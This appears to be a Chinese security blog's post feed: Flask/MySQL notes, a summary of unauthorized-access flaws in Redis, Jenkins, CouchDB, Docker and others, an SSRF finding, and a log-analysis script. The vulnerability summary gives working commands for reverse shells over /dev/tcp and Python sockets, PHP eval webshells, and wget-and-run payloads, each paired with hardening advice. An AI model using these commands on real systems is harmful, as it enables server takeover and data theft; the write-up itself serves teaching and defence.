flask中jsonify的作用jsonify的作用实际上就是将我们传入的json形式数据序列化成为json字符串，作为响应的body，并且设置响应的Content-Type为application/json，构造出响应返回至客户端 效果等于json.dumps jsonify的Content-Type字段值为application/json json.dumps的Content-Type字段值为text/html 修改flask中静态文件夹修改的flask默认的static文件夹只需要在创建Flask实例的时候,把static_folder和static_url_path参数设置为空字符串即可。 app = Flask(__name__, static_folder=&#39;&#39;, static_url_path=&#39;&#39;) 访问的时候用url_for函数，res文件夹和static文件夹同一级： url_for(&#39;static&#39;, filename=&#39;res/favicon.ico&#39;) werkzeugwerkzeug是一个WSGI工具包，可以作为一个Web框架的底层库。它封装好了很多Web框架的东西，例如 Request，Response等等。Flask框架就是一Werkzeug 为基础开发的 generate_password_hash(password)将用户输入的明文密码加密成密文进行存储 密码加盐哈希函数。用来将明文密码加密，返回加密后的密文，用来进行用户注册 函数定义： 12345678werkzeug.security.generate_password_hash(password, method='pbkdf2:sha1', salt_length=8)密文格式：method$salt$hashpassword: 明文密码method: 哈希的方式（需要是hashlib库支持的），格式为pbpdf2:&lt;method&gt;[:iterations]。参数说明： method：哈希的方式，一般为SHA1， iterations：（可选参数）迭代次数，默认为1000。slat_length: 盐值的长度，默认为8 check_password_hash(hash,password)验证经过generate_password_hash哈希的密码，将明文和密文进行比较,查看是否一致，用来验证用户登录 函数定义： 123werkzeug.security.check_password_hash(pwhash, password)pwhash: generate_password_hash生成的哈希字符串password: 需要验证的明文密码 flask中的session123from flask import sessionuser = db['users'].find_one(username=username)session['user_id'] = user['id'] 由于使用了session，所以需要设置一个secret_key用来做一些模块的hashFlask Web Development 中的内容: SECRET_KEY配置变量是通用密钥,可在Flask和多个第三方扩展中使用。如其名所示,加密的强度取决于变量值的机密度。不同的程序要使用不同的密钥,而且要保证其他人不知道你所用的字符串。 SECRET_KEY的作用主要是提供一个值做各种HASH, 是在其加密过程中作为算法的一个参数(salt或其他)。所以这个值的复杂度也就影响到了数据传输和存储时的复杂度。 flask 变量规则要给URL添加变量部分，你可以把这些特殊的字段标记为&lt;variable_name&gt;， 这个部分将会作为命名参数传递到你的函数。规则可以用&lt;converter:variable_name&gt;指定一个可选的转换器 123@route('/hello/&lt;name&gt;')def index(name): return '&lt;b&gt;Hello &#123;&#123;name&#125;&#125;&lt;/b&gt;!' 数据库查询对dataset的数据查询，使用冒号来为变量传参。 select f.task_id from flags f where f.user_id = :user_id&#39;&#39;&#39;,user_id=session[&#39;user_id&#39;]) 模板渲染使用render_template方法来渲染模板。将模板名和你想作为关键字的参数传入模板的变量 MySQLIFNULL(expr1,expr2) 如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2。 IFNULL()返回一个数字或字符串值，取决于它被使用的上下文环境。 max函数是用来找出记录集中最大值的记录 121. 对于left join，不管on后面跟什么条件，左表的数据全部查出来，因此要想过滤需把条件放到where后面2. 对于inner join，满足on后面的条件表的数据才能查出，可以起到过滤作用。也可以把条件放到where后面 在使用left jion时，on和where条件的区别如下： 121、 on条件是在生成临时表时使用的条件，它不管on中的条件是否为真，都会返回左边表中的记录。2、where条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有left join的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。 order by的用法 123456使用order by，一般是用来，依照查询结果的某一列（或多列）属性，进行排序（升序：ASC；降序：DESC；默认为升序）。当排序列含空值时：ASC：排序列为空值的元组最后显示。DESC：排序列为空值的元组最先显示。可以把null值看做无穷大select * from s order by sno desc, sage asc group by的用法 123456789101112131415161718group by按照查询结果集中的某一列（或多列），进行分组，值相等的为一组1、细化集函数（count，sum，avg，max，min）的作用对象：未对查询结果分组，集函数将作用于整个查询结果。对查询结果分组后，集函数将分别作用于每个组。SELECT cno,count(sno) from sc group by cno2、GROUP BY子句的作用对象是查询的中间结果表分组方法：按指定的一列或多列值分组，值相等的为一组。使用GROUP BY子句后，SELECT子句的列名列表中只能出现分组属性（比如：sno）和集函数（比如：count（））select sno,count(cno) from sc group by sno3、多个列属性进行分组select cno,grade,count(cno) from sc group by cno,grade4、使用HAVING短语筛选最终输出结果只有满足HAVING短语指定条件的组才输出。HAVING短语与WHERE子句的区别：作用对象不同。1、WHERE子句作用于基表或视图，从中选择满足条件的元组。2、HAVING短语作用于组，从中选择满足条件的组select sno from sc group by sno having count(cno)&gt;3select sno,count(cno) from sc where grade&gt;60 group by sno having count(cno)&gt;3 MySQL的左连接、右连接、等值连接1.左连接（left join ）123select m.columnname……,n.* columnname…..from left_table m left join right_table n on m.columnname_join=n.columnname_join and n.columnname=xxxwhere m.columnname=xxx….. ON是连接条件，用于把2表中等值的记录连接在一起，但是不影响记录集的数量。若是表left_table中的某记录，无法在表right_table找到对应的记录，则此记录依然显示在记录集中，只是表right_table需要在查询显示的列的值用NULL替代； ON连接条件中表n.columnname=xxx用于控制right_table表是否有符合要求的列值还是用NULL替换的方式显示在查询列中，不影响记录集的数量； WHERE字句控制记录是否符合查询要求，不符合则过滤掉 2.右连接（right join）123select m.columnname……,n.* columnname…..from left_table m right join right_table n on m. columnname_join=n. columnname_join and m. columnname=xxxwhere n.columnname=xxx….. 3.等值连接12345678select m.columnname……,n.* columnname…..from left_table m [inner] join right_table n on m. columnname_join=n. columnname_joinwhere m.columnname=xxx….. and n.columnname=xxx….或者select m.columnname……,n.* columnname…..from left_table m , right_table nwhere m. columnname_join=n. columnname_join andm.columnname=xxx….. and n.columnname=xxx…. ON是连接条件，不再与左连接或右连接的功效一样，除了作为2表记录匹配的条件外，还会起到过滤记录的作用，若left_table中记录无法在right_table中找到对应的记录，则会被过滤掉； WHERE字句，不管是涉及表left_table、表right_table上的限制条件，还是涉及2表连接的条件，都会对记录集起到过滤作用，把不符合要求的记录刷选掉； jinja2获取循环索引1234567jinja2获取循环&#123;% for i in n %&#125;的索引使用loop.index&#123;% for i in names %&#125;&lt;tr&gt; &lt;td&gt;&#123;&#123; loop.index &#125;&#125;&lt;/td&gt; //当前是第x条 &lt;td&gt;&#123;&#123; i.name &#125;&#125;&lt;/td&gt;&lt;/tr&gt;&#123;% endfor %&#125; flask 重定向和错误可以用redirect()函数把用户重定向到其它地方。放弃请求并返回错误代码，用abort()函数。 12345678from flask import abort, redirect, url_for@app.route('/')def index(): return redirect(url_for('login'))@app.route('/login')def login(): abort(401) this_is_never_executed() 默认情况下，错误代码会显示一个黑白的错误页面。如果你要定制错误页面，可以使用errorhandler() 装饰器: 1234from flask import render_template@app.errorhandler(404)def page_not_found(error): return render_template('page_not_found.html'), 404 注意 render_template()调用之后的 404 。这告诉Flask，该页的错误代码是404 ，即没有找到。默认为200，也就是一切正常。 flask CSRF防护机制123456789101112@app.before_requestdef csrf_protect(): if request.method == "POST": token = session.pop('_csrf_token', None) if not token or token != request.form.get('_csrf_token'): abort(403)def some_random_string(): return hashlib.sha256(os.urandom(16).hexdigest())def generate_csrf_token(): if '_csrf_token' not in session: session['_csrf_token'] = some_random_string() return session['_csrf_token'] 在flask的全局变量里面注冊 上面那个生成随机token的函数 app.jinja_env.globals[&#39;csrf_token&#39;] = generate_csrf_token 在网页的模板是这么引入的 12&lt;form method=post action=""&gt; &lt;input name=_csrf_token type=hidden value="&#123;&#123; csrf_token() &#125;&#125;"&gt; flask上下文处理器Flask 上下文处理器自动向模板的上下文中插入新变量。上下文处理器在模板渲染之前运行，并且可以在模板上下文中插入新值。上下文处理器是一个返回字典的函数，这个字典的键值最终将传入应用中所有模板的上下文: 123@app.context_processordef inject_user(): return dict(user=g.user) 上面的上下文处理器使得模板可以使用一个名为user值为g.user的变量。不过这个例子不是很有意思，因为g在模板中本来就是可用的，但它解释了上下文处理器是如何工作的。变量不仅限于值，上下文处理器也可以使某个函数在模板中可用（由于Python允许传递函数）: 1234567@app.context_processordef utility_processor(): def format_price(amount, currency=u'€'): return u'&#123;0:.2f&#125;&#123;1&#125;.format(amount, currency) return dict(format_price=format_price)上面的上下文处理器使得format_price函数在所有模板中可用:&#123;&#123; format_price(0.33) &#125;&#125; 日志记录handler = logging.FileHandler(&#39;flask.log&#39;, encoding=&#39;UTF-8&#39;) 1、请求之前设置requestId并记录日志每个URL请求之前，定义requestId并绑定到g 1234@app.before_requestdef before_request(): g.requestId = gen_requestId() logger.info("Start Once Access, and this requestId is %s" % g.requestId) 2、请求之后添加响应头与记录日志每次返回数据中，带上响应头，包含API版本和本次请求的requestId，以及允许所有域跨域访问API, 记录访问日志 123456789101112131415161718@app.after_requestdef add_header(response): response.headers["X-SaintIC-Media-Type"] = "saintic.v1" response.headers["X-SaintIC-Request-Id"] = g.requestId response.headers["Access-Control-Allow-Origin"] = "*" logger.info(json.dumps(&#123; "AccessLog": &#123; "status_code": response.status_code, "method": request.method, "ip": request.headers.get('X-Real-Ip', request.remote_addr), "url": request.url, "referer": request.headers.get('Referer'), "agent": request.headers.get("User-Agent"), "requestId": str(g.requestId), &#125; &#125; )) return response basicConfig方法可以满足你在绝大多数场景下的使用需求，但是basicConfig有一个很大的缺点。调用basicConfig其实是给root logger添加了一个handler(FileHandler )，这样当你的程序和别的使用了 logging的第三方模块一起工作时，会影响第三方模块的logger行为。这是由logger的继承特性决定的 1234567logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s', datefmt='%a, %d %b %Y %H:%M:%S', filename='logs/pro.log', filemode='w')logging.debug('dddddddddd') MySQL字符编码除了设置数据库的之外，由于dataset默认创建数据库和表的字符集不是utf8,所以需要自己设置，否则会中文乱码，所以需要修改表的字符集 1234567my.cnf[client]default-character-set=utf8[mysqld]character-set-server=utf8collation-server=utf8_general_cidefault-storage-engine=INNODB 表的字符集 show create table tasks; alter table tasks convert to character set utf8;]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>MySQL</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[未授权访问漏洞总结]]></title>
    <url>%2F2017%2F09%2F28%2F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[前言今年5月，比特币勒索病毒WannaCry席卷全球，国内众多机构部门计算机系统瘫痪。根据之前应急响应的案例分析，以及一些安全报告统计，目前大部分的勒索病毒均利用未授权访问等通用漏洞进行植入、勒索，尤其是Redis、MongoDB等数据库的未授权访问漏洞尤其严重。 0x01 介绍未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。 目前主要存在未授权访问漏洞的有：NFS服务，Samba服务，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo等，本文主要介绍一些目前比较常用的一些服务的未授权访问，欢迎大家补充！ 0x02 Redis未授权访问2.1 漏洞描述Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。 2.2 漏洞利用1、利用计划任务执行命令反弹shell在redis以root权限运行时可以写crontab来执行命令反弹shell 先在自己的服务器上监听一个端口 nc -lvnp 4444 然后执行命令:12345redis-cli -h 192.168.2.6set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1\n"config set dir /var/spool/cron/config set dbfilename rootsave 2、写ssh-keygen公钥登录服务器在以下条件下，可以利用此方法 1、Redis服务使用root账号启动2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。 此方法具体参考：redis配置不当可直接导致服务器被控制3、获取web服务的webshell当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。 执行以下命令1234config set dir /var/www/html/config set dbfilename shell.phpset x "&lt;?php @eval($_POST['caidao']);?&gt;"save 即可将shell写入web目录 2.3 漏洞加固可以配置redis.conf这个文件，在安装目录下 默认只对本地开放 bind 127.0.0.1 添加登陆密码 requirepass www.secpulse.com 在需要对外开放的时候修改默认端口 port 2333 最后还可以配合iptables限制开放 0x03 Jenkins未授权访问3.1 漏洞描述默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。 3.2 漏洞利用1、Jenkins未授权访问可执行命令http://www.secpulse.com:8080/managehttp://www.secpulse.com:8080/scriptprintln “ifconfig -a”.execute().text 执行一些系统命令直接wget下载back.py反弹shell123println "wget http://xxx.secpulse.com/tools/back.py -P /tmp/".execute().textprintln "python /tmp/back.py 10.1.1.111 8080".execute().textback.py并不需要root权限 不想反弹试试Terminal Plugin2、Jenkins未授权访问写shelljenskins是java web项目,我们用java的File类写文件12345new File("c://temp//secpulse.txt").write("""123"""); 新建一个内容为1,2,3(每一行)的1.txt到c盘的temp文件夹,运行如下命令println “powershell dir c:\temp”.execute().text如果写成功,那么secpulse.txt就会在返回结果中!wget写webshell12345678910111. println "wget http://shell.secpulse.com/data/t.txt -o /var/www/html/secpulse.php".execute().text2. new File("/var/www/html/secpulse.php").write('&lt;?php @eval($_POST[s3cpu1se]);?&gt;');3. def webshell = '&lt;?php @eval($_POST[s3cpu1se]);?&gt;'new File("/var/www/html/secpulse.php").write("$webshell");4. def execute(cmd) &#123;def proc = cmd.execute()proc.waitFor()&#125;execute( [ 'bash', '-c', 'echo -n "&lt;?php @eval($" &gt; /usr/local/nginx_1119/html/secpulse.php' ] )execute( [ 'bash', '-c', 'echo "_POST[s3cpu1se]);?&gt;" &gt;&gt; /usr/local/nginx_1119/html/secpulse.php' ] )//参数-n 不要在最后自动换行 Result: 0 表示成功写入 Result: 1 表示目录不存在或者权限不足 写入失败 Result: 2 表示构造有异常 写入失败 具体其他详细利用方法参考：知其一不知其二之Jenkins Hacking 3.3 漏洞加固 禁止把Jenkins直接暴露在公网 添加认证，建议使用用户矩阵或者与JIRA打通，JIRA设置密码复杂度 0x04 MongoDB未授权访问4.1 漏洞描述开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。 4.2 漏洞利用 4.3 漏洞加固 为MongoDB添加认证： 123451)MongoDB启动时添加--auth参数2)给MongoDB添加用户：use admin #使用admin库db.addUser("root", "123456") #添加用户名root密码123456的用户db.auth("root","123456") #验证下是否添加成功，返回1说明成功 禁用HTTP和REST端口 1MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false 限制绑定IP 1234启动时加入参数--bind_ip 127.0.0.1或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1 0x05 ZooKeeper未授权访问5.1 漏洞描述Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。 5.2 漏洞利用执行以下命令即可远程获取该服务器的环境： echo envi | nc ip port 直接连接： ./zkCli.sh -server ip:port 5.3 漏洞加固 禁止把Zookeeper直接暴露在公网 添加访问控制，根据情况选择对应方式（认证用户，用户名密码） 绑定指定IP访问 0x06 Elasticsearch未授权访问6.1 漏洞描述Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据 6.2 漏洞利用漏洞检测：默认端口9200 相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。 http://x.x.x.x:9200/_nodes http://x.x.x.x:9200/_river 6.3 漏洞加固 防火墙上设置禁止外网访问此端口。 使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证 在config/elasticsearch.yml中为9200端口设置认证： 1234http.basic.enabled true #开关，开启会接管全部HTTP连接http.basic.user "admin" #账号http.basic.password "admin_pw" #密码http.basic.ipwhitelist ["localhost", "127.0.0.1"] 0x07 Memcache未授权访问7.1 漏洞描述Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。 7.2 漏洞利用1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。 2、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在 7.3 漏洞加固 设置memchached只允许本地访问 禁止外网访问Memcached 11211端口 编译时加上–enable-sasl，启用SASL认证 0x08 Hadoop未授权访问8.1 漏洞描述由于服务器直接在开放了Hadoop机器HDFS的50070 web端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。 8.2 漏洞利用主要HDFS和MapReduce的WebUI对应的服务端口。其中比较重要的是DataNode 默认端口50075开放的话，攻击者可以通过hdsf提供的restful api对hdfs存储数据进行操作。 restful api参考：http://hadoop.apache.org/docs/r1.0.4/webhdfs.html 8.3 漏洞加固 如无必要，关闭Hadoop Web管理页面 开启身份验证，防止未经授权用户访问 设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问包括50070以及WebUI等相关端口，详细端口列表如下： 123456789101112131415a)HDFSNameNode 默认端口 50070DataNode 默认端口 50075httpfs 默认端口14000journalnode 默认端口 8480b)YARN（JobTracker）ResourceManager 默认端口8088JobTracker 默认端口 50030TaskTracker 默认端口 50060c)Hue 默认端口 8080d)YARN（JobTracker）master 默认端口 60010regionserver 默认端口60030e)hive-server2 默认端口 10000f)spark-jdbcserver 默认端口 10003 0x09 CouchDB未授权访问9.1 漏洞描述CouchDB默认在5984端口开放Restful的API接口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关API对服务器上的数据进行任意的增删改查，其中通过API修改local.ini配置文件，可进一步导致执行任意系统命令，获取服务器权限！ 9.2 漏洞利用新增query_server配置，这里执行ifconfig命令 curl -X PUT ‘http://x.x.x.x:5984/_config/query_servers/cmd‘ -d ‘“/sbin/ifconfig &gt;/tmp/6666”‘ 新建一个临时表，插入一条记录 curl -X PUT ‘http://x.x.x.x:5984/vultest‘ curl -X PUT ‘http://x.x.x.x:5984/vultest/vul‘ -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’ 调用query_server处理数据 curl -X POST ‘http://x.x.x.x:5984/vultest/_temp_view?limit=11‘ -d ‘{“language”:”cmd”,”map”:””}’ -H ‘Content-Type: application/json’ 当然你也可以直接执行其他命令，下载个其他什么的 9.3 漏洞加固 指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。 设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码 0x10 Docker未授权访问10.1 漏洞描述Docker Remote API是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个API，通过这个接口，我们可以新建container，删除已有的container，甚至是获取宿主机的shell 10.2 漏洞利用http://192.168.198.130:2375/v1.25/images/json 可以获取到所有的 images 列表 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，过Post包我们还可以新建、开启和关闭容器，其他操作比如拉取image等操作也都可以通过API调用完成。 12345$ curl http://10.10.10.10:2375/containers/json[]docker -H=tcp://10.10.10.10:2375 ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES Docker remote Api未授权访问的攻击原理与之前的Redis未授权访问漏洞大同小异，都是通过向运行该应用的服务器写文件，从而拿到服务器的权限，常见的利用方法如下: 1、启动一个容器，挂载宿主机的/root/目录，之后将攻击者的ssh公钥~/.ssh/id_rsa.pub的内容写到入宿主机的/root/.ssh/authorized_keys文件中，之后就可以用root账户直接登录了 2、启动一个容器，挂载宿主机的/etc/目录，之后将反弹shell的脚本写入到/etc/crontab中，攻击者会得到一个反弹的shell，其中反弹shell脚本的样例如下：1echo -e "*/1 * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" &gt;&gt; /etc/crontab 第2种利用方法也可以挂载var/spool/cron/目录，将反弹shell的脚本写入到/var/spool/cron/root（centos系统）或/var/spool/cron/crontabs/root(ubuntu系统) 10.3 漏洞加固 在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式： 12设置ACL，仅允许信任的来源IP连接；设置TLS认证，官方的文档为Protect the Docker daemon socket 客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1 123export DOCKER_CERT_PATH=~/.dockerexport DOCKER_HOST=tcp://10.10.10.10:2375export DOCKER_API_VERSION=1.12 在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证 附：Python未授权访问脚本参考文章https://www.secpulse.com/archives/55928.html https://www.secpulse.com/archives/49115.html https://www.secpulse.com/archives/6540.html https://xianzhi.aliyun.com/forum/mobile/read/750.html https://book.thief.one/webying-yong-lou-dong/136-elasticsearchwei-shou-quan-fang-wen-lou-dong.html https://www.secpulse.com/archives/2166.html https://github.com/findys/sunburst/ https://yeasy.gitbooks.io/docker_practice/ 安全脉搏链接未授权访问漏洞总结]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>未授权访问</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全脉搏漏洞挖掘小记]]></title>
    <url>%2F2017%2F08%2F07%2F%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[不知道大家之前对安全脉搏打开的时候是不是感觉响应很慢，所以最近一直在排查，然后重新更换wordpress主题进行改版升级。在对安全脉搏进行维护、更新的时候，偶然之间发现了脉搏上的几个漏洞，在此记录下。 首先，打开主页。 打开某个网站不知道大家有什么习惯，但是作为一个”程序员”的我来说(伪程序员,我最喜欢有人叫我程序员了)，F12没关过。[斜眼笑] 不知道大家看这个图之后敏不敏感，反正我是挺敏感的(让我装个逼)。不知道为啥，这么久了竟然没人发现… 要是你你咋玩，首先我来了个百度https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png&amp;h=304&amp;w=504&amp;zc=1 惊喜来了，竟然把网站绝对路径报出来了！信息比较敏感，我就不放图了。 这就存在两个漏洞了： 没有关闭错误回显 没有对src参数的静态文件链接作校验 然后看到src参数，大家会想到啥，没错！SSRF！ 来一波试试 没毛病！ 然后我就想着 这是不是个通用漏洞啊，没准拿个CVE呢(不要揭穿我，让我意淫一会)，然后我搜了下，竟然真没有这个插件的SSRF漏洞，但是！！！悲伤的是我发现竟然不维护更新了。。。好吧。。 然后搜了一下这个插件的其他漏洞，竟然发现个命令执行！嘿嘿嘿嘿嘿。。。 不说了，四爷在我身边呢，我怕被打死。 PS:大家不要玩了，已经修复了。。。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>命令执行</tag>
        <tag>SSRF</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[看我如何用20行代码做日志分析]]></title>
    <url>%2F2017%2F07%2F29%2F%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E7%94%A820%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%81%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[不管是渗透测试、应急响应还是运维，日志分析都万分重要。而linux下日志分析最好的工具那就是linux自带的各种命令了。本文将从一个小例子来介绍”如何用linux命令做日志分析”。 0x00 源码1234567891011121314151617181920212223242526272829#!/bin/bashif ls ./*.result &amp;&gt; /dev/nullthen rm *.resultfitouch log.resultfor i in www-*.logdo echo $i ... awk '$9 == 200 &#123;print $7&#125;' $i|grep -i '^/admin/upload/.*\.html$'|sort|uniq -c|sed 's/^ *//g' &gt; $i.result cat $i.result &gt;&gt; log.result echo $i.result finisheddoneecho final.log.result ...sort -k2 log.result | uniq -f1 --all-repeated=separate |./log.awk |sort -rn &gt; final.log.resultecho final.log.result finishedlog.awk#!/usr/bin/awk -fBEGIN&#123; RS=""&#125; &#123; sum=0 for(i=1;i&lt;=NF;i++)&#123; if((i%2)!=0)&#123; sum += $i&#125; &#125; print sum,$2 &#125; 0x01 Apache日志以apache日志为例，下面是三条普通的apache日志记录。12358.40.124.211 - - [25/Jul/2017:08:53:12 +0800] "GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html HTTP/1.1" 200 4649 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"58.40.124.211 - - [25/Jul/2017:08:53:12 +0800] "GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/js/jquery-2.2.4.min.js HTTP/1.1" 200 85578 "http://121.43.182.76/vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"58.40.124.211 - - [25/Jul/2017:08:53:13 +0800] "GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/favicon.ico HTTP/1.1" 200 1517 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0" 58.40.124.211表示访问者IP，25/Jul/2017:08:53:12 +0800表示时间，GET表示请求方法，vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html表示访问的地址，HTTP/1.1表示使用HTTP协议的1.1版本，200表示响应状态码，Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0表示访问者user-agent 我们分析一般关注的主要就是： IP地址 访问的地址 状态码 本次就只演示获取某个地址的访问量并排序，即：访问量 地址这种效果。 0x02 思路Apache日志文件格式形如201707029.log,根据文件格式设计总体思路如下: 处理每天的日志，统计每日文章访问量 生成每月访问结果，统计月度访问量 生成每年访问结果，统计年度访问量 0x03 命令解析0x03.1 awkawk &#39;$9 == 200 {print $7}&#39; $i awk默认是以空格作为分隔符，$9表示匹配是200的响应，打印出第七个字段 0x03.2 grepgrep -i &#39;^/admin/upload/.*\.html$&#39; 根据awk匹配的结果，匹配访问的地址是/admin/upload/.*\.html的记录。i表示不区分大小写，^$是正则表达式的开头结尾。 0x03.3 sortsort -k2 log.result 由于合成的记录是无序的，所以要将相同的归类。但是第一字段是访问次数，所以使用k2参数根据网址排序。sort -rn &gt; final.log.result 对awk脚本的处理结果进行排序，sort默认使用第一个字段，参数r表示逆序，从大往小排；参数n表示以数值形式排序 0x03.4 uniquniq -c 使用uniq过滤重复的记录，-c表示添加该记录出现的次数。uniq -f1 --all-repeated=separate 参数f1表示忽略第一个字段（访问次数），只考虑后面的字段（网址）。参数all-repeated=separate，表示过滤掉所有只出现一次的记录，保留所有重复的记录，并且每一组之间用一个空行分隔 0x03.5 sedsed &#39;s/^ *//g&#39; &gt; $i.result 由于uniq过滤后每条记录前面都是有空格的，所以要先删除掉。sed命令是一个处理行文本的编辑器，&#39;s/^ *//g&#39;是一个正则表达式(^和*之间有一个空格)表示每行记录的空格替换为空（即删除）并将排序结果重定向到文件。 0x03.6 &gt;和&gt;&gt;&gt;表示重定向，即输出覆盖，&gt;&gt;也是重定向，但是是表示追加 0x03.7 log.awk首先，默认情况下，awk将”\n”作为记录的分隔符，设置RS=””表示改为将空行作为分隔符其次，NF是一个awk的内置变量，表示当前行的字段总数。由于输入文件之中，每一行都包含两个字段，第一个是访问数，第二个是网址，所以这里做一个条件判断，只要是奇数字段就累加，偶数字段则一律跳过。最后，每个记录输出一个累加值和网址，它们之间用空格分割。 参考文章：http://www.cnblogs.com/51linux/archive/2012/05/23/2515299.htmlhttp://blog.csdn.net/long2746004900/article/details/53367353http://www.cnblogs.com/wangqiguo/p/5863266.htmlhttp://blog.csdn.net/github_33736971/article/details/54286736http://blog.csdn.net/wenxuechaozhe/article/details/52564394http://www.cnblogs.com/dong008259/archive/2011/12/07/2279897.html]]></content>
      <tags>
        <tag>编程</tag>
        <tag>自动化</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
        <tag>日志分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跟着DVWA学Web安全开发]]></title>
    <url>%2F2017%2F07%2F10%2F%E8%B7%9F%E7%9D%80DVWA%E5%AD%A6Web%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%2F</url>
